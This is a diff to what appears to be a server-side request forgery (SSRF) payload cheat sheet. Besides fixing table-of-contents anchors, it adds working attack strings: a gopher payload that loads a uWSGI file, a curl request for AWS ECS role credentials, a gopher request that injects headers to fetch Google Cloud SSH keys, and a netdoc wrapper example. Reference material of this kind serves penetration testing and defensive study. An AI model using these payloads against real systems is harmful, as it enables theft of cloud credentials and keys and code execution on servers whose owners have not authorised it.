@@ -8,17 +8,17 @@
 * [Payloads with localhost](#payloads-with-localhost)
 * [Bypassing filters](#bypassing-filters)
   * [Bypass using HTTPS](#bypass-using-https)
-  * [Bypass localhost with [::]](#bypass-localhost-with----)
+  * [Bypass localhost with [::]](#bypass-localhost-with-)
   * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
   * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
   * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
-  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6-ipv4-address-embedding)
+  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
   * [Bypass using bash variables](#bypass-using-bash-variables)
   * [Bypass using tricks combination](#bypass-using-tricks-combination)
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
-  * [Bypass filter_var() php function](#bypass-filter-var-php-function)
+  * [Bypass filter_var() php function](#bypass-filter_var-php-function)
   * [Bypass against a weak parser](#bypass-against-a-weak-parser)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
   * [file://](#file)
@@ -28,9 +28,12 @@
   * [tftp://](#tftp)
   * [ldap://](#ldap)
   * [gopher://](#gopher)
+  * [netdoc://](#netdoc)
+* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
+  * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
   * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
   * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
   * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
@@ -50,6 +53,7 @@
 - [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
 - [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
+- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
 
 ## Payloads with localhost
 
@@ -344,6 +348,36 @@ Content of evil.com/redirect.php:
 ?>
 ```
 
+### Netdoc
+
+Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
+
+```powershell
+ssrf.php?url=gopher://127.0.0.1:4242/DATA
+```
+
+## SSRF exploiting WSGI
+
+Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
+
+```powershell
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+```
+
+| Header    |           |             |
+|-----------|-----------|-------------|
+| modifier1 | (1 byte)  | 0 (%00)     |
+| datasize  | (2 bytes) | 26 (%1A%00) |
+| modifier2 | (1 byte)  | 0 (%00)     |
+
+| Variable (UWSGI_FILE) |           |    |            |   |
+|-----------------------|-----------|----|------------|---|
+| key length            | (2 bytes) | 10 | (%0A%00)   |   |
+| key data              | (m bytes) |    | UWSGI_FILE |   |
+| value length          | (2 bytes) | 12 | (%0C%00)   |   |
+| value data            | (n bytes) |    | /tmp/test.py   |   |
+	
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -421,6 +455,15 @@ E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugi
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
 
+### SSRF URL for AWS ECS
+
+If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.
+
+```powershell
+curl http://169.254.170.2/v2/credentials/<UUID>
+```
+
+This way you'll extract IAM keys of the attached role
 
 ### SSRF URL for AWS Elastic Beanstalk
 
@@ -455,6 +498,8 @@ Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-ap
 
 ### SSRF URL for Google Cloud
 
+:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.
+
 Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
 
 ```powershell
@@ -477,6 +522,12 @@ Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
 ```powershell
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+Required headers can be set using a gopher SSRF with the following technique
+
+```powershell
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
 ```
 
 Interesting files to pull out:
@@ -606,6 +657,11 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
 bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 ```
 
+More info:
+
+- Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
+- Docker Engine API: https://docs.docker.com/engine/api/latest/
+
 ### SSRF URL for Rancher
 
 ```powershell
@@ -646,3 +702,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
 - [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
+- [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
